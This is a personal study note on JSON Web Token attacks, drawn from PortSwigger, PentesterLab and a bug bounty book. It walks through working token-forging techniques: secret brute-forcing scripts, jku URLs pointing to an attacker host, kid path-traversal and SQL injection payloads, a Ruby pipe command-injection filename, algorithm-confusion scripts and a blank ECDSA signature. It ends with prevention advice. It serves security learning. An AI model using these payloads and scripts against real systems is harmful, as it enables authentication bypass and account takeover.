---
title: Notes - JWT Attacks
author: juba0x00
image:
    path: /assets/images/JWT-attacks/jwt.png
date: 2023-09-30 20:00:00 +0800
categories: Notes
description: "JWT attacks notes from PentesterLab, Portswigger, and Bug Bounty Bootcamp"
tags: [jwt, jwt-attacks, authentication, authorization]
toc: true
---

# [go to attacks, Skip Introduction](#accepting-arbitrary-signatures-does-not-verify-the-signature)

- **Sources, Credits:**
    - [PortSwigger](https://portswigger.net/web-security/jwt)
    - [Bug Bounty Bootcamp by Vickie Li](https://www.amazon.com/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities/dp/1718501544)
    - [PentesterLab](https://pentesterlab.com/)

---

# What is JSON Web Tokens (JWT)

JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data but are most commonly used to send information ("claims") about users as part of authentication, session handling, and access control mechanisms.

Unlike with classic session tokens, all of the data that a server needs is stored client-side within the JWT itself. This makes JWTs a popular choice for highly distributed websites where users need to interact seamlessly with multiple back-end servers.

## JWT format Header.Payload.Signature

### Header

- header identifies the hash algorithm used to generate the signature (base64url-encoded)
- example: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`  is the encoding of  `{ "alg" : "HS256", "typ" : "JWT" }`

### →Payload

The payload section contains information about the user’s identity. This section, too, is base64url encoded before being used in the token. Here’s an
example of the payload section, which is the base64url-encoded string of `{ "username" : "admin" }`: `eyAidXNlcm5hbWUiIDogImFkbWluIn0`

### →Signature

The server that issues the token typically generates the signature by hashing the header and payload. In some cases, they also encrypt the resulting hash. Either way, this process involves a secret signing key. This mechanism provides a way for servers to verify that none of the data within the token has been tampered with since it was issued:

- As the signature is directly derived from the rest of the token, changing a single byte of the header or payload results in a mismatched signature.
- Without knowing the server's secret signing key, it shouldn't be possible to generate the correct signature for a given header or payload.

the signature section validates that the user hasn’t tampered with the token. It’s calculated by concatenating the header with the payload, then signing it with the algorithm specified in the header, and a **secret key**. Here’s what a JWT signature looks like `4Hb/6ibbViPOzq9SJflsNGPWSk6B8F6EqVrkNjpXh7M`

## JWT Example

 **Header.Payload.Signature**

**eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Xs1l2H7ui_yqE-GlQ2GARQ5ZpjuS8B8xQaooy89Q8y8**

---

# **JWT vs. JWS vs. JWE**

The JWT specification is actually very limited. It only defines a format for representing information ("claims") as a JSON object that can be transferred between two parties. In practice, JWTs aren't really used as a standalone entity. The JWT spec is extended by both the JSON Web Signature (JWS) and JSON Web Encryption (JWE) specifications, which define concrete ways of actually implementing JWTs.

![Untitled](/assets/images/JWT-attacks/Untitled.png)

![Untitled](/assets/images/JWT-attacks/Untitled%201.png)

- JWE provides **Confidentiality**
- JWS provides **Integrity**

In other words, a JWT is usually either a JWS or JWE token. When people use the term "JWT", they almost always mean a JWS token. **JWEs are very similar, except that the actual contents of the token are encrypted rather than just encoded.**

---

# What are JWT attacks

JWT attacks refer to sending altered JWTs to a server with the intent of bypassing authentication and accessing controls by impersonating an already authenticated user.

---

# **What is the impact of JWT attacks?**

JWT attacks can have severe consequences, as attackers who can generate valid tokens with custom values can potentially elevate their privileges or impersonate other users, taking full control over their accounts.

---

# **How do vulnerabilities to JWT attacks arise?**

JWT vulnerabilities typically arise due to flawed JWT handling within the application itself. The [various specifications](https://portswigger.net/web-security/jwt#jwt-vs-jws-vs-jwe) related to JWTs are relatively flexible by design, allowing website developers to decide on many implementation details for themselves. This can result in them accidentally introducing vulnerabilities even when using battle-hardened libraries.

These implementation flaws usually mean that the signature of the JWT is not verified properly. This enables an attacker to tamper with the values passed to the application via the token's payload. Even if the signature is robustly verified, whether it can truly be trusted relies heavily on the server's secret key remaining a secret. If this key is leaked in some way or can be guessed or brute-forced, an attacker can generate a valid signature for any arbitrary token, compromising the entire mechanism.

---

# Attacks

## Accepting arbitrary signatures (Does not verify the signature)

JWT libraries typically provide one method for verifying tokens and another that just decodes them. For example, the Node.js library `jsonwebtoken` has `verify()` and `decode()`.

Occasionally, developers confuse these two methods and only pass incoming tokens to the `decode()` method. This effectively means that the application doesn't verify the signature at all.

## **Accepting tokens with no signature (`"alg": "none"`)**

JWTs can be signed using various algorithms, but can also be left unsigned. In this case, the `alg` parameter is set to `none`, which indicates a so-called "unsecured JWT". Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as this kind of filtering relies on string parsing, you can sometimes bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.

Consider, for example, the following token:

- `eyAiYWxnIiA6ICJOb25lIiwgInR5cCIgOiAiSldUIiB9Cg`.`eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg`.
This token is simply the base64url-encoded versions of these two blobs, with no signature present: `{ "alg" : "none", "typ" : "JWT" }`.`{ "user" : "admin" }`
- This feature was originally used for debugging purposes, but if not turned off in a production environment, it would allow attackers to forge any token they want and impersonate anyone on the site.

Among other things, the JWT header contains an `alg` parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.

```json
{
    "alg": "none",
    "typ": "JWT"
}
```

This is inherently flawed because the server has no option but to implicitly trust user-controllable input from the token which, at this point, hasn't been verified at all. In other words, an attacker can directly influence how the server checks whether the token is trustworthy.

<aside>
⚠️ **Even if the token is unsigned, the payload part must still be terminated with a trailing dot.**

</aside>

## **Brute-forcing secret keys**

Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a password, it's crucial that this secret can't be easily guessed or brute-forced by an attacker. Otherwise, they may be able to create JWTs with any header and payload values they like, and then use the key to re-sign the token with a valid signature.

When implementing JWT applications, **developers sometimes make mistakes like forgetting to change default or placeholder secrets**. They may even copy and paste code snippets they find online, then forget to change a hardcoded secret that's provided as an example. In this case, it can be trivial for an attacker to brute-force a server's secret using a [wordlist of well-known secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).

Download: 

[jwt.secrets.list](/assets/images/JWT-attacks/jwt.secrets.list)

If an attacker is not able to brute-force the key, they might try leaking the secret key instead. If another vulnerability, like a directory traversal, external entity attack (XXE), or SSRF exists that allows the attacker to read the file where the key value is stored, the attacker can steal the key and sign arbitrary tokens of their choosing.

- Using hashcat
    
    ```bash
    hashcat -a 0 -m 16500 "$token" wordlist.txt
    ```
    
- Using https://github.com/ticarpi/jwt_tool
    
    ```bash
    python3 jwt_tool.py "$token" -C -d wordlist.txt
    ```
    
- simple python script
    
    ```python
    import hmac 
    import base64
    import hashlib
    from sys import argv
    
    if len(argv) != 3:
        print(f"Usage: python3 {argv[0]} <token> <wordlist>")
        exit(1)
    
    token = argv[1]
    
    header, payload, signature = token.split('.')
    
    def sign(token, key):
        return base64.urlsafe_b64encode(hmac.new(key.encode('utf8'), token.encode('utf8'), digestmod=hashlib.sha256).digest()).decode('utf-8').rstrip('=')
    
    def load_wordlist(file_name):
        with open(file_name, 'r') as f:
            return f.read().splitlines()
    
    if __name__ == "__main__":
        gusses = load_wordlist(argv[2])
        for guess in gusses:
            if sign(header + '.' + payload, guess) == signature:
                print(f"Secret key is: {guess}")
                exit(0)
    ```
    

## **JWT header parameter injections**

According to the JWS specification, only the `alg` header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.

- `jwk` (JSON Web Key) - Provides an embedded JSON object representing the key.
- `jku` (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
- `kid` (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching `kid` parameter.

As you can see, these user-controllable parameters each tell the recipient server which key to use when verifying the signature. In this section, you'll learn how to exploit these to inject modified JWTs signed using your own arbitrary key rather than the server's secret.

### **Injecting self-signed JWTs via the `jwk` parameter**

The JSON Web Signature (JWS) specification describes an optional `jwk` header parameter, which servers can use to embed their **public key** directly within the token itself in JWK format.

<aside>
💡 A JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.

</aside>

You can see an example of this in the following JWT header:

```json
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```

<aside>
💡 NOTE:

The server does not need the private key to verify the signature; the private key is used to sign the message, not verify it. The public key is what does the verification.

</aside>

Ideally, servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured servers sometimes use any key that's embedded in the `jwk` parameter.

You can exploit this behavior by signing a modified JWT using your own RSA private key, and then embedding the matching public key in the `jwk` header.

### injecting self-signed token via `x5c` header

`x5c` attribute (X.509 URL) is a header point to an `X.509` public key certificate that can be used to validate the signature

x5c attribute in JWK is just a certificate with the following format:

- without the first and last lines
    - `-----BEGIN CERTIFICATE-----`
    - `-----END CERTIFICATE-----`
- and without all the new lines

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
```

add the certificate content on a `jwk` respecting the format mentioned in [x5c attribute in JWK is just a certificate with the following format:](#injecting-self-signed-token-via-x5c-header), we can sign using the private key and send the token with **`x5u`** header points to our jwk

### **Injecting self-signed JWTs via the `jku` parameter**

some servers let you use the `jku` (JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL.

<aside>
💡 A JWK Set is a JSON object containing an array of JWKs representing different keys. You can see an example of this below.

</aside>

```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```

JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`.

More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering. We covered some [examples of these](https://portswigger.net/web-security/ssrf#ssrf-with-whitelist-based-input-filters) in our topic on [SSRF](https://portswigger.net/web-security/ssrf).

- You can embed credentials in a URL before the hostname, using the `@` character. For example:
    - `https://expected-host:fakepassword@**evil-host`**   due to the missing `**/` in filtration**
- You can use the `#` character to indicate a URL fragment. For example:
    - `https://**evil-host**#expected-host`
- You can leverage the DNS naming hierarchy to place required input into a fully qualified DNS name that you control. For example:
    - `https://expected-host.**evil-host**`
- Steps
    - generate the key in BurpSuite
    - add this key to a file in the web server in this format
    - replace the `kid` in the JWT to match the generated key `kid`
    - add `jku`  with the file link

### Bypass restricted `jku` parameter using Open Redirect

- if the application does not accept `jku` set to other hosts, and there is an endpoint vulnerable to open redirect, we can use an **Open Redirect** vulnerability to get our JWK file used and bypass the restriction (since our malicious URL will start with the URL of the vulnerable application).
- example:
- `https://vulnerable.com/redirect?uri=**/register**`  is vulnerable to open redirect, we can host our jwk and use that vulnerable endpoint to redirect the server to our jwk like the following:
    - `https://vulnerable.com/redirect?uri=**http://attacker.host/.well-known/jwks.json`**
    - we can use directory traversal if the server checks `.well-known`:  `https://vulnerable.com/.well-known/jwks.json/../../redirect?uri=**http://attacker.host/.well-known/jwks.json`**
- now we can sign the token using our generated key and make the server verify it using our jwk

### Bypass restricted `jku` parameter using HTTP response splitting

we can use HTTP response splitting vulnerability to bypass `jku` restrictions, like the following

```
http://vulnerable.com/.well-known/../debug?value=any_value%0d%0aContent-Length: **LENGTH**%0d%0a%0d%0a**RESPONSE**
```

![Untitled](/assets/images/JWT-attacks/Untitled%202.png)

- as shown above, we can add our JWK instead, like the following

![Untitled](/assets/images/JWT-attacks/Untitled%203.png)

we can use this vulnerable endpoint in `jku` to return our JWK and the server verifies using it

```json
"jku": "http://vulnerable.com/.well-known/../debug?value=1337%0d%0aContent-Length:%2043%0d%0a%0d%0a%7B%22keys%22:%5B%7B%22kty%22:%22RSA%22,%22use%22:%22sig%22,%22e%22:%22AQAB%22,%22kid%22:%22pentesterlab%22,%22n%22:%22qGkM2xNc2T1hXccAM5cTtW73hbV350hVjt0O2EF-0SA8dryPuKUcijGsMtFt8Ny5OdKAYao5QBqeA0PV_QfrlO06YUW4tRYb24IeQVKIjuYCOg92BZRTNex-wlKEUv16Daku1AN63FB_z3N_NXPpquG5n6Dtr9zaBZ7agSe1RHaPs5MTrJAiFHdz6AtpZ8MJldnbdf0PJ0NY7nvUyvut1BLKVcd5ikkCxY-bkXDHKcxHKktm7_2SGIXyU06-WxY9gsrWRpaqSnubPz8M0OfPPgrRKEEo4Z7flRh-dcoVhH94ZroGUe0rqbo7WctgSBAIloVOqx9REnB8BXjc-oMgTw%22,%22alg%22:%22RS256%22%7D%5D%7D"
```

### **Injecting self-signed JWTs via the `kid` parameter**

Servers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a `kid` (Key ID) parameter, which helps the server identify which key to use when verifying the signature.

Verification keys are often stored as a JWK Set. In this case, the server may simply look for the JWK with the same `kid` as the token. However, the JWS specification doesn't define a concrete structure for this ID - it's just an arbitrary string of the developer's choosing. For example, they might use the `kid` parameter to point to a particular entry in a database, or even the name of a file.

If this parameter is also vulnerable to [directory traversal](https://portswigger.net/web-security/file-path-traversal), an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.

```json
{
    "kid": "../../../../../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

This is especially dangerous if the server also supports JWTs signed using a [symmetric algorithm](https://portswigger.net/web-security/jwt/algorithm-confusion#symmetric-vs-asymmetric-algorithms). In this case, an attacker could potentially point the `kid` parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.

You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, signing the token with an empty string will result in a valid signature.

<aside>
💡 If you're using the JWT Editor extension, note that this doesn't let you sign tokens using an empty string. However, due to a bug in the extension, you can get around this by using a Base64-encoded null byte. or [jwt.io](http://jwt.io) with an empty string as a key

</aside>

If the server stores its verification keys in a database, the `kid` header parameter is also a potential vector for [SQL injection](https://portswigger.net/web-security/sql-injection) attacks.

### **`CVE-2017-17405` in Ruby `Net::FTP`: Command injection in `kid` parameter**

- Ruby has to ways to open a file:
    - `File.open`
    - `Kernel.open` or `open`
- `Kernel.open/open` will run the filename as a command if the filename starts with a pipe | like the following `| echo "Command Injection" > /tmp/PoC.txt`
    
    ![Screenshot_20230928_124511.png](/assets/images/JWT-attacks/Screenshot_20230928_124511.png)
    
- **Since the signature is checked after the vulnerability is exploited, you don't need to provide a valid signature in this exercise.**

### SQLi in `kid` parameter

- Often used to retrieve a key from:
    - file system
    - database
- we talked about [**Injecting self-signed JWTs via the `kid` parameter**](#injecting-self-signed-jwts-via-the-kid-parameter) above, let's talk about signing JWT with a known secret using SQLi
- suppose the following header
    
    ```json
    {
        "typ": "JWT",
        "alg": "HS256",
        "kid": "key1"
    }
    ```
    
- if the developer uses `kid` value to get the secret from the database, usually the SQL query will be something like this:
    
    ```sql
    SELECT secret FROM jwt_secrets WHERE key = 'your-kid-value-here';
    ```
    
- we can exploit SQL to return a known secret like the following
    
    ```sql
    SELECT secret FROM jwt_secrets WHERE key = 'any_key_does_not_exist' UNION SELECT 'my_secret';
    ```
    
    - `kid = any_key_does_not_exist' UNION SELECT 'my_secret`
- Now we can sign a new tampered token and it will be verified successfully on the server.

## Algorithm confusion attacks Introduction

### **Symmetric vs. asymmetric algorithms**

JWTs can be signed using a range of different algorithms. Some of these, such as HS256 (HMAC + SHA-256) use a "symmetric" key. This means that the server uses a single key to both sign and verify the token. Clearly, this needs to be kept secret, just like a password.

![https://portswigger.net/web-security/jwt/images/jwt-symmetric-signing-algorithm.jpg](https://portswigger.net/web-security/jwt/images/jwt-symmetric-signing-algorithm.jpg)

Other algorithms, such as RS256 (RSA + SHA-256) use an "asymmetric" key pair. This consists of a private key, which the server uses to sign the token, and a mathematically related public key that can be used to verify the signature.

![https://portswigger.net/web-security/jwt/images/jwt-asymmetric-signing-algorithm.jpg](https://portswigger.net/web-security/jwt/images/jwt-asymmetric-signing-algorithm.jpg)

As the names suggest, the private key must be kept secret, but the public key is often shared so that anybody can verify the signature of tokens issued by the server.

- Another way attackers can exploit the alg field is by changing the type of algorithm used. The two most common types of signing algorithms used for JWTs are HMAC and RSA. HMAC requires the token to be signed with a key and then later verified with the same key. When using RSA, the token would first be created with a private key, then verified with the corresponding public key, which anyone can read. It is critical that the secret key for HMAC tokens and the private key for RSA tokens be kept a secret.
- Now let’s say that an application was originally designed to use RSA tokens. The tokens are signed with a private key A, which is kept a secret from the public. Then the tokens are verified with public key B, which is available to anyone. This is okay as long as the tokens are always treated as RSA tokens. Now if the attacker changes the alg field to HMAC, they might be able to create valid tokens by signing the forged tokens with the RSA public key, B. When the signing algorithm is switched to HMAC, the token is still verified with the RSA public key B, but this time, the token can be signed with the same public key too.
- Notice that we can’t get the private key from the public key, however, we can get the public key from the private key

### **How do algorithm confusion vulnerabilities arise?**

Algorithm confusion vulnerabilities typically arise due to flawed implementation of JWT libraries. Although the actual verification process differs depending on the algorithm used, many libraries provide a single, algorithm-agnostic method for verifying signatures. These methods rely on the `alg` parameter in the token's header to determine the type of verification they should perform.

The following pseudo-code shows a simplified example of what the declaration for this generic `verify()` method might look like in a JWT library:

```jsx
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key
    }
}
```

Problems arise when website developers who subsequently use this method assume that it will exclusively handle JWTs signed using an asymmetric algorithm like RS256. Due to this flawed assumption, they may always pass a fixed public key to the method as follows:

```
publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);
```

If the server receives a token signed using a symmetric algorithm like HS256, the library's generic `verify()` method will treat the public key as an HMAC secret. This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature.

<aside>
💡 The public key you use to sign the token must be absolutely identical to the public key stored on the server. This includes using the same format (such as X.509 PEM) and preserving any non-printing characters like newlines. In practice, you may need to experiment with different formatting in order for this attack to work.

</aside>

## Performing algorithm confusion attacks

### 1. Obtain the server’s public key

1. **Servers sometimes expose their public keys as JSON Web Key (JWK) objects via a standard endpoint mapped to `/jwks.json` or `/.well-known/jwks.json`, for example. These may be stored in an array of JWKs called `keys`. This is known as a JWK Set.**
2. **Even if the key isn't exposed publicly, you may be able to [extract it from a pair of existing JWTs](https://portswigger.net/web-security/jwt/algorithm-confusion#deriving-public-keys-from-existing-tokens).**
    
    <aside>
    ⚠️ Extracting public keys from existing tokens
    
    In cases where the public key isn't readily available, you may still be able to test for algorithm confusion by deriving the key from a pair of existing JWTs. This process is relatively simple using tools such as `[jwt_forgery.py](https://github.com/silentsignal/rsa_sign2n)`. You can find this, along with several other useful scripts, on the `[rsa_sign2n` GitHub repository](https://github.com/silentsignal/rsa_sign2n).
    
    We have also created a simplified version of this tool, which you can run as a single command:
    
    ```bash
    docker run --rm -it portswigger/sig2n `cat token1.txt` `cat token2.txt`
    ```
    
    This uses the JWTs that you provide to calculate one or more potential values of `n`. Don't worry too much about what this means - all you need to know is that only one of these matches the value of `n` used by the server's key. For each potential value, our script outputs:
    
    - A Base64-encoded PEM key in both X.509 and PKCS1 format.
    - A forged JWT signed using each of these keys.
    
    To identify the correct key, use Burp Repeater to send a request containing each forged JWT. Only one of these will be accepted by the server. You can then use the matching key to construct an algorithm confusion attack.
    
    </aside>
    
3. **you may get the public key from a JavaScript script or from a mobile application**

### →2.  **Convert the public key to a suitable format**

Although the server may expose its public key in JWK format, when verifying the signature of a token, it will use its own copy of the key from its local filesystem or database. This may be stored in a different format.

In order for the attack to work, the version of the key that you use to sign the JWT must be identical to the server's local copy. In addition to being in the same format, every single byte must match, including any non-printing characters.

For the purpose of this example, let's assume that we need the key in X.509 PEM format. You can convert a JWK to a PEM using the [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) extension in Burp as follows:

1. With the extension loaded, in Burp's main tab bar, go to the **JWT Editor Keys** tab.
2. Click **New RSA** Key. In the dialog, paste the JWK that you obtained earlier.
3. Select the **PEM** radio button and copy the resulting PEM key.
4. Go to the **Decoder** tab and Base64-encode the PEM.
5. Go back to the **JWT Editor Keys** tab and click **New Symmetric Key**.
6. In the dialog, click **Generate** to generate a new key in JWK format.
7. Replace the generated value for the `k` parameter with a Base64-encoded PEM key that you just copied.
8. Replace the generated value for the `kid` parameter with the original token `kid`, so the server can verify it 
9. Save the key.

### **3. Modify your JWT**

Once you have the public key in a suitable format, you can [modify the JWT](https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite#editing-the-contents-of-jwts) however you like. Just make sure that the `alg` header is set to `HS256`.

### **4. Sign the JWT using the public key**

[Sign the token](https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite#signing-jwts) using the HS256 algorithm with the RSA public key as the secret.

### Tools

- https://github.com/ticarpi/jwt_tool is a very powerful tool
    
    ```bash
    python3 jwt_tool.py "token" -X k -I -pc username pv admin -pk $public_key_file
    ```
    
    - `-X k` key confusion
- simple script
    
    ```python
    import hmac
    import base64
    import hashlib
    from sys import argv
    
    if len(argv) != 3:
        print(f'Usage: {argv[0]} <Tampered JWT> <public_key_file>')
        exit(1)
    
    tampered_token = argv[1]
    with open(argv[2], 'r') as file:
        public_key = file.read()
        
    
    print('you should edit the payload to your needs (e.g. change the username')
    
    header, payload, _ = tampered_token.split('.')
    
    # decode the header
    dec_header = base64.urlsafe_b64decode(header + '=' * (-len(header) % 4)).decode('utf-8').replace('RS256', 'HS256')
    enc_header = base64.urlsafe_b64encode(bytes(dec_header, 'utf-8')).decode('utf-8').replace('=', '')
    print(enc_header)
    
    signature = base64.urlsafe_b64encode(hmac.new(bytes(public_key, 'utf-8'), bytes(f'{header}.{payload}', 'utf-8'), hashlib.sha256).digest()).decode('utf-8').replace('=', '')
    
    print(f'{header}.{payload}.{signature}')
    ```
    

### Another algorithm confusion example (ECDSA to HS256)

In practice, you can change the algorithm used by the application (ECDSA - **ES256**) to tell it to use HMAC (**HS256**).
The application will call the method **verify** when you send the cookie. Since the code is written to use ECDSA, it will call **verify(public_key, data)**.
But since the algorithm is set to HMAC, it will end up calling **HMAC(public_key,data)**.
The application will verify the signature with the public key but since you are forcing the application to use HMAC, it will actually verify the signature with **HMAC(public_key, data)**.
As an attacker, you will need to recover potential public keys from a valid signature and then try them

```python
import base64
import hashlib
from hashlib import sha256
import hmac
import json
from ecdsa.ecdsa import Signature, generator_256
from ecdsa import VerifyingKey, NIST256p
from sys import argv

if len(argv) != 2:
    print(f"Usage: python3 {argv[0]} <jwt token>")
    exit(1)

jwt = argv[1]

header, payload, signature = jwt.split('.')

signature = base64.urlsafe_b64decode(signature)

sig = Signature(int.from_bytes(signature[0:32], 'big'), int.from_bytes(signature[32:], 'big'))

keys = sig.recover_public_keys(int.from_bytes(sha256((header + '.' + payload).encode('utf8')).digest(), 'big'), generator_256)

header = json.loads(base64.urlsafe_b64decode(header + '==').decode('utf8'))
payload = json.loads(base64.urlsafe_b64decode(payload + '==').decode('utf8'))
header['alo'] = "HS256"
payload['login'] = "admin"

tampered_header = base64.urlsafe_b64encode(json.dumps(header).encode('utf8')).decode('utf8')
tampered_payload = base64.urlsafe_b64encode(json.dumps(payload).encode('utf8')).decode('utf8')

for key in keys:
    veryfing_key = VerifyingKey.from_public_point(key.point, curve=NIST256p)
    signing = str(veryfing_key.to_pem().decode('utf8'))
    print(signing)
    newsig = base64.urlsafe_b64encode(hmac.new(veryfing_key.to_pem(), (tampered_header+'.'+tampered_payload).encode('utf8'), digestmod=hashlib.sha256).digest()).decode('utf8')
    print(tampered_header+'.'+tampered_payload+'.'+newsig)
```

- the script will print the possible public keys and tampered tokens, try tokens to know the valid key

## **CVE-2022-21449 Bypass ECDSA  signature (Java 15/16/17/18)**

To exploit this vulnerability, you will need to forge a signature with both `r` and `s` equal to 0. To do this, you will need to look at JWT libraries in your favorite language that supports Elliptic Curve and see how they encode `r` and `s` as part of the signature

Python script to generate a blank signature ****

```python
from ecdsa.ecdsa import Signature
from ecdsa.util import sigencode_der
import base64

sig = Signature(0, 0) 

print(base64.urlsafe_b64encode(sigencode_der(0, 0, 1)).strip(b'=').decode('utf-8'))
```

signature: `MAYCAQACAQA` 

we can use this signature to bypass signature verification

---

# **How to prevent JWT attacks**

You can protect your own websites against many of the attacks we've covered by taking the following high-level measures:

- Use an up-to-date library for handling JWTs and make sure your developers fully understand how it works, along with any security implications. Modern libraries make it more difficult for you to inadvertently implement them insecurely, but this needs to be foolproof due to the inherent flexibility of the related specifications.
- Make sure that you perform robust signature verification on any JWTs that you receive, and account for edge cases such as JWTs signed using unexpected algorithms.
- Enforce a strict whitelist of permitted hosts for the `jku` header.
- Make sure that you're not vulnerable to [path traversal](https://portswigger.net/web-security/file-path-traversal) or SQL injection via the `kid` header parameter.

## **Additional best practice for JWT handling**

Although not strictly necessary to avoid introducing vulnerabilities, we recommend adhering to the following best practice when using JWTs in your applications:

- Always set an expiration date for any tokens that you issue.
- Avoid sending tokens in URL parameters where possible.
- Include the `aud` (audience) claim (or similar) to specify the intended recipient of the token. This prevents it from being used on different websites.
- Enable the issuing server to revoke tokens (on logout, for example).